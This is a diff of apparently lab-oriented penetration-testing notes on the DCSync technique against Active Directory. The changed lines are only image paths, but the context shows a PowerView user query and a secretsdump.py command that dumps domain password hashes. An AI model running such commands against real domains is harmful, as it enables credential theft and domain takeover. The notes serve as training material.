@@ -6,7 +6,7 @@ technique for stealing the Active Directory password database by using the built
 **need privilege `DS-Replication-Get-Changes-All`**
 {% endhint %}
 
-![image.png](<../../../../.gitbook/assets/image (1).png>)
+![image.png](<../../../../.gitbook/assets/image (1) (1).png>)
 
 ***
 
@@ -16,7 +16,7 @@ technique for stealing the Active Directory password database by using the built
     Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
     ```
 
-    <figure><img src="../../../../.gitbook/assets/image 1.png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../../../../.gitbook/assets/image 1 (1).png" alt=""><figcaption></figcaption></figure>
 *   **show privilege using sid**
 
     ```powershell
@@ -43,7 +43,7 @@ technique for stealing the Active Directory password database by using the built
     secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
     ```
 
-    <figure><img src="../../../../.gitbook/assets/image 2.png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../../../../.gitbook/assets/image 2 (1).png" alt=""><figcaption></figcaption></figure>
 
     **now we have 3 files with different type**
 *
